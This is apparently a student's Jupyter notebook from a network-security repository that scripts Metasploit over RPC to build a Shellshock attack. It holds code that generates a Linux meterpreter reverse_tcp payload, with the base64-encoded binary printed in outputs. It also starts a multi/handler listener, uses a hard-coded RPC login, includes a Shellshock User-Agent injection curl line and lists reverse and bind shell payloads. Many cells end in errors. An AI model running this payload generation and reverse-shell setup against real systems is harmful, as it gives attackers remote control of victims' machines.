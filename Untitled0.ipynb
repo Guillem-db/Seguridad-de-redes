{
 "metadata": {
  "name": "",
  "signature": "sha256:11a0d28811bac945a333c3590c64c08b1f0b1d45957da460e4f27f62e3c7fbe2"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import socket\n",
      "print([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith(\"127.\")][:1])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "[]\n"
       ]
      }
     ],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "from netifaces import interfaces, ifaddresses, AF_INET\n",
      "def get_current_IP():\n",
      "  for ifaceName in interfaces():\n",
      "    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]\n",
      "    #print '%s: %s' % (ifaceName, ', '.join(addresses))\n",
      "  return addresses[0] "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "get_current_IP()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "lo: 127.0.0.1\n",
        "eth0: 192.168.1.33\n"
       ]
      },
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 14,
       "text": [
        "'192.168.1.33'"
       ]
      }
     ],
     "prompt_number": 14
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%file metasploit_interface.py\n",
      "import msfrpc\n",
      "import msgpack\n",
      "from netifaces import interfaces, ifaddresses, AF_INET\n",
      "import time\n",
      "\n",
      "def get_current_IP():\n",
      "  for ifaceName in interfaces():\n",
      "    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]\n",
      "    #print '%s: %s' % (ifaceName, ', '.join(addresses))\n",
      "  return addresses[0] \n",
      "\n",
      "def init_console():\n",
      "  client = msfrpc.Msfrpc({'port':'55552','host':'127.0.0.1'})\n",
      "  auth =client.login('admin','pene')\n",
      "  if auth:\n",
      "    console=client.call('console.create',[])\n",
      "    return client,console\n",
      "  else:\n",
      "    print \"Error\"\n",
      "    \n",
      "def print_console(client,console):\n",
      "  while True:\n",
      "   readedData=client.call('console.read',[console['id']])   \n",
      "   if len(readedData['data'])>1:\n",
      "      #readedData=readedData['data']\n",
      "      print readedData['data']      \n",
      "   if readedData['busy']==True:\n",
      "        print readedData['data']        \n",
      "        time.sleep(1)\n",
      "        continue\n",
      "   break      \n",
      "        \n",
      "def payload_shellshock(client,console):\n",
      "    print_console(client,console)\n",
      "    cmd='msfpayload linux/x86/meterpreter/reverse_tcp lhost='+(get_current_IP())+' lport=4444 X > p1.bin && chmod 755 p1.bin && cat p1.bin | base64'\n",
      "    client.call('console.write',[console['id'],cmd+'\\n'])\n",
      "    while True:\n",
      "      readedData=client.call('console.read',[console['id']])\n",
      "      if readedData['busy']==True:\n",
      "        time.sleep(1)\n",
      "        print readedData['data']   \n",
      "        continue\n",
      "      payload=readedData['data'][:-1]\n",
      "    #client.call('console.destroy',[console['id']])\n",
      "      return payload\n",
      "    \n",
      "def create_shellshock_payload():\n",
      "    client0,console0=init_console()\n",
      "    payload=payload_shellshock(client0,console0)\n",
      "    print \"Payload succesfully generated: \",payload\n",
      "    client0.call('console.destroy',[console0['id']])\n",
      "    return payload\n",
      "\n",
      "def meterpreter_handler(LPORT='4444'):\n",
      "    client0,console0=init_console()\n",
      "    print_console(client0,console0)\n",
      "    \n",
      "    cmd='use exploit/multi/handler'\n",
      "    cmd2='set payload linux/x86/meterpreter/reverse_tcp'\n",
      "    cmd3='set LHOST '+get_current_IP()\n",
      "    cmd4='set LPORT '+LPORT\n",
      "    cmd5='exploit'\n",
      "    comands=[cmd,cmd2,cmd3,cmd4,cmd5]\n",
      "    msf_comands(comands,client0,console0)\n",
      "    return client0,console0\n",
      "\n",
      "def msf_comands(comands,client,console):\n",
      "  for cmd in comands:  \n",
      "    client.call('console.write',[console['id'],cmd+'\\n'])\n",
      "    print cmd\n",
      "    i=0\n",
      "    while i<20:\n",
      "      readedData=client.call('console.read',[console['id']]) \n",
      "      if readedData['busy']==True:\n",
      "        time.sleep(1)\n",
      "        i+=1\n",
      "        print readedData['data'],i   \n",
      "        continue\n",
      "         \n",
      "      break  \n",
      "            \n",
      "def restore_console(client,console):    \n",
      "    readedData=client.call('console.session_kill',[console['id']])    \n",
      "    return init_console()\n",
      "\n",
      "def read_console(client,console,n=5):\n",
      "    for i in range(n):\n",
      "     print client.call('console.read',[console['id']])['data'] \n",
      "        \n",
      "def new_console(client):        \n",
      "    try:\n",
      "        return client.call('console.create',[])\n",
      "    except:\n",
      "        print \"Error creando la nueva consola\"\n",
      "        "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Overwriting metasploit_interface.py\n"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "handcli,handcons=meterpreter_handler()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        " ______________________________________________________________________________\n",
        "|                                                                              |\n",
        "|                   METASPLOIT CYBER MISSILE COMMAND V4                        |\n",
        "|______________________________________________________________________________|\n",
        "      \\                                  /                      /\n",
        "       \\     .                          /                      /            x\n",
        "        \\                              /                      /\n",
        "         \\                            /          +           /\n",
        "          \\            +             /                      /\n",
        "           *                        /                      /\n",
        "                                   /      .               /\n",
        "    X                             /                      /            X\n",
        "                                 /                     ###\n",
        "                                /                     # % #\n",
        "                               /                       ###\n",
        "                      .       /\n",
        "     .                       /      .            *           .\n",
        "                            /\n",
        "                           *\n",
        "                  +                       *\n",
        "\n",
        "                                       ^\n",
        "####      __     __     __          #######         __     __     __        ####\n",
        "####    /    \\ /    \\ /    \\      ###########     /    \\ /    \\ /    \\      ####\n",
        "################################################################################\n",
        "################################################################################\n",
        "# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #\n",
        "################################################################################\n",
        "                                                           http://metasploit.pro\n",
        "\n",
        "\n",
        "       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]\n",
        "+ -- --=[ 1387 exploits - 781 auxiliary - 223 post        ]\n",
        "+ -- --=[ 356 payloads - 37 encoders - 8 nops             ]\n",
        "+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\n",
        "\n",
        "\n",
        "use exploit/multi/handler\n",
        "set payload linux/x86/meterpreter/reverse_tcp\n",
        "set LHOST 192.168.1.33\n",
        "set LPORT 4499\n",
        "exploit\n"
       ]
      }
     ],
     "prompt_number": 12
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "handcons['id']"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 6,
       "text": [
        "'0'"
       ]
      }
     ],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "def restore_console(client,console):    \n",
      "    readedData=client.call('console.session_kill',[console['id']])    \n",
      "    return init_console()\n",
      "\n",
      "def read_console(client,console,n=5):\n",
      "    for i in range(n):\n",
      "     print client.call('console.read',[console['id']])['data'] \n",
      "        \n",
      "def new_console(client):        \n",
      "    try:\n",
      "        return client.call('console.create',[])\n",
      "    except:\n",
      "        print \"Error creando la nueva consola\""
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 9
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "handcons"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 4,
       "text": [
        "{'busy': False, 'id': '0', 'prompt': 'msf > '}"
       ]
      }
     ],
     "prompt_number": 4
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "handcli,handcons=restore_console(handcli,handcons)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "read_console(handcli,handcons)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "payload => linux/x86/meterpreter/reverse_tcp\n",
        "LHOST => 192.168.1.33\n",
        "LPORT => 4499\n",
        "[*] Started reverse handler on 192.168.1.33:4499 \n",
        "[*] Starting the payload handler...\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 13
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "console0=new_console(handcli)\n",
      "console0"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 10,
       "text": [
        "{'busy': False, 'id': '1', 'prompt': 'msf > '}"
       ]
      }
     ],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "create_shellshock_payload()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": []
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "NameError",
       "evalue": "name 'payload' is not defined",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
        "\u001b[1;32m<ipython-input-5-249c850f62ea>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mpayload\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
        "\u001b[1;31mNameError\u001b[0m: name 'payload' is not defined"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import urllib2\n",
      "\n",
      "#manager = urllib2.HTTPPasswordMgrWithDefaultRealm()\n",
      "#manager.add_password(None, 'https://app.streamsend.com/emails', 'login', 'key')\n",
      "#handler = urllib2.HTTPBasicAuthHandler(manager)\n",
      "\n",
      "director = urllib2.OpenerDirector()\n",
      "#director.add_handler(handler)\n",
      "\n",
      "req = urllib2.Request('http://example.com/', headers = {'Accept' : 'application/xml'})\n",
      "\n",
      "result = director.open(req)\n",
      "# result.read() will contain the data\n",
      "# result.info() will contain the HTTP headers\n",
      "\n",
      "# To get say the content-length header\n",
      "length = result.info()['Content-Length']"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "AttributeError",
       "evalue": "'NoneType' object has no attribute 'info'",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[1;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
        "\u001b[1;32m<ipython-input-6-85a69f10b0a2>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[0;32m     15\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m     16\u001b[0m \u001b[1;31m# To get say the content-length header\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m---> 17\u001b[1;33m \u001b[0mlength\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mresult\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0minfo\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'Content-Length'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
        "\u001b[1;31mAttributeError\u001b[0m: 'NoneType' object has no attribute 'info'"
       ]
      }
     ],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#! curl -H \"User-Agent: () { :; }; /bin/eject\" http://example.com/ \n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 3
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload+'> /tmp/p2.bin && echo;/usr/bin/base64 -d /tmp/p2.bin > /tmp/p1.bin'"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "NameError",
       "evalue": "name 'payload' is not defined",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
        "\u001b[1;32m<ipython-input-4-9d45fdb0c0ec>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[0mpayload\u001b[0m\u001b[1;33m+\u001b[0m\u001b[1;34m'> /tmp/p2.bin && echo;/usr/bin/base64 -d /tmp/p2.bin > /tmp/p1.bin'\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
        "\u001b[1;31mNameError\u001b[0m: name 'payload' is not defined"
       ]
      }
     ],
     "prompt_number": 4
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "print_console(client0,console0)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA\n",
        "AAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1towKgBIWgCABFcieFq\n",
        "ZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E=\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 6
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "module.encode( String: Data, String: EncoderModule, Hash: Options )"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "SyntaxError",
       "evalue": "invalid syntax (<ipython-input-8-294cd4f7da5f>, line 1)",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;36m  File \u001b[1;32m\"<ipython-input-8-294cd4f7da5f>\"\u001b[1;36m, line \u001b[1;32m1\u001b[0m\n\u001b[1;33m    module.encode( String: Data, String: EncoderModule, Hash: Options )\u001b[0m\n\u001b[1;37m                         ^\u001b[0m\n\u001b[1;31mSyntaxError\u001b[0m\u001b[1;31m:\u001b[0m invalid syntax\n"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "client.call('console.list',[])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 5,
       "text": [
        "{'consoles': [{'busy': False, 'id': '3', 'prompt': 'msf > '}]}"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd4='use payload/windows/shell_bind_tcp'\n",
      "#print client.call('console.write',['1',cmd4+'\\n'])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 10
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload=shellshock_pwn()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "IIIIII    dTb.dTb        _.---._\n",
        "  II     4'  v  'B   .'\"\".'/|\\`.\"\"'.\n",
        "  II     6.     .P  :  .' / | \\ `.  :\n",
        "  II     'T;. .;P'  '.'  /  |  \\  `.'\n",
        "  II      'T; ;P'    `. /   |   \\ .'\n",
        "IIIIII     'YvP'       `-.__|__.-'\n",
        "\n",
        "I love shells --egypt\n",
        "\n",
        "\n",
        "       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]\n",
        "+ -- --=[ 1387 exploits - 781 auxiliary - 223 post        ]\n",
        "+ -- --=[ 356 payloads - 37 encoders - 8 nops             ]\n",
        "+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\n",
        "\n",
        "\n",
        "[*] exec: msfpayload linux/x86/meterpreter/reverse_tcp lhost=192.168.1.33 lport=4444 X > p1.bin && chmod 755 p1.bin && cat p1.bin | base64\n",
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "Payload succesfully generated:  f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA\n",
        "AAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1towKgBIWgCABFcieFq\n",
        "ZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E=\n"
       ]
      }
     ],
     "prompt_number": 3
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 4,
       "text": [
        "'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA\\nAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1towKgBIWgCABFcieFq\\nZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E='"
       ]
      }
     ],
     "prompt_number": 4
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#client.call('module.encoders',[])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 27
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "cmd='msfpayload linux/x86/meterpreter/reverse_tcp lhost=192.168.1.37 lport=4444 X > p1.bin && chmod 755 p1.bin && cat p1.bin | base64'\n",
      "cmd2='generate'\n",
      "cmd3='LHOST=127.0.0.1'\n",
      "client.call('console.write',[console['id'],cmd+'\\n'])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 2,
       "text": [
        "{'wrote': 129}"
       ]
      }
     ],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "readedData=client.call('console.read',[console['id']])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 13
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload=readedData['data'][:-1]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 14
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "readedData"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 15,
       "text": [
        "{'busy': False,\n",
        " 'data': 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA\\nAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1towKgBJWgCABFcieFq\\nZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E=\\n',\n",
        " 'prompt': 'msf > '}"
       ]
      }
     ],
     "prompt_number": 15
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 16,
       "text": [
        "'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA\\nAAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1towKgBJWgCABFcieFq\\nZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E='"
       ]
      }
     ],
     "prompt_number": 16
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import time\n",
      "while True:\n",
      " readedData=client.call('console.read',[console['id']])   \n",
      " if len(readedData['data'])>1:\n",
      "    print readedData['data']\n",
      " if readedData['busy']==True:\n",
      "        time.sleep(1)\n",
      "        continue\n",
      " break       \n",
      "    "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "NameError",
       "evalue": "name 'client' is not defined",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
        "\u001b[1;32m<ipython-input-5-8290e0d6e9af>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[1;32mimport\u001b[0m \u001b[0mtime\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      2\u001b[0m \u001b[1;32mwhile\u001b[0m \u001b[0mTrue\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 3\u001b[1;33m  \u001b[0mreadedData\u001b[0m\u001b[1;33m=\u001b[0m\u001b[0mclient\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mcall\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34m'console.read'\u001b[0m\u001b[1;33m,\u001b[0m\u001b[1;33m[\u001b[0m\u001b[0mconsole\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'id'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      4\u001b[0m  \u001b[1;32mif\u001b[0m \u001b[0mlen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mreadedData\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'data'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m>\u001b[0m\u001b[1;36m1\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      5\u001b[0m     \u001b[1;32mprint\u001b[0m \u001b[0mreadedData\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'data'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
        "\u001b[1;31mNameError\u001b[0m: name 'client' is not defined"
       ]
      }
     ],
     "prompt_number": 5
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "print readedData['data']"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "KeyError",
       "evalue": "'data'",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[1;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
        "\u001b[1;32m<ipython-input-8-e276d7a30330>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mprint\u001b[0m \u001b[0mreadedData\u001b[0m\u001b[1;33m[\u001b[0m\u001b[1;34m'data'\u001b[0m\u001b[1;33m]\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
        "\u001b[1;31mKeyError\u001b[0m: 'data'"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# Get a list of the exploits from the server\n",
      "mod = client.call('module.exploits',[])\n",
      "# Grab the first item from the modules value of the returned dict\n",
      "print \"Compatible payloads for : %s\\n\" % mod['modules'][0]\n",
      "# Get the list of compatible payloads for the first option\n",
      "ret = client.call('module.compatible_payloads',[mod['modules'][0]])\n",
      "for i in (ret.get('payloads')):\n",
      "  print \"\\t%s\" % i\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Compatible payloads for : aix/local/ibstat_path\n",
        "\n",
        "\tcmd/unix/bind_perl"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "\tcmd/unix/bind_perl_ipv6\n",
        "\tcmd/unix/reverse_perl\n",
        "\tcmd/unix/reverse_perl_ssl\n"
       ]
      }
     ],
     "prompt_number": 18
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "mod = client.call('module.exploits',[])"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 50
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#mod"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 52
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "#mod = client.call('module.exploits')\n",
      "# Grab the first item from the modules value of the returned dict\n",
      "print \"Compatible payloads for : %s\\n\" % mod['modules'][0]\n",
      "# Get the list of compatible payloads for the first option\n",
      "ret = client.call('module.compatible_payloads',[mod['modules'][0]])\n",
      "for i in (ret.get('payloads')):\n",
      "  print \"\\t%s\" % i"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Compatible payloads for : aix/local/ibstat_path\n",
        "\n",
        "\tcmd/unix/bind_perl"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "\tcmd/unix/bind_perl_ipv6\n",
        "\tcmd/unix/reverse_perl\n",
        "\tcmd/unix/reverse_perl_ssl\n"
       ]
      }
     ],
     "prompt_number": 53
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "ret"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 19,
       "text": [
        "{'payloads': ['cmd/unix/bind_perl',\n",
        "  'cmd/unix/bind_perl_ipv6',\n",
        "  'cmd/unix/reverse_perl',\n",
        "  'cmd/unix/reverse_perl_ssl']}"
       ]
      }
     ],
     "prompt_number": 19
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}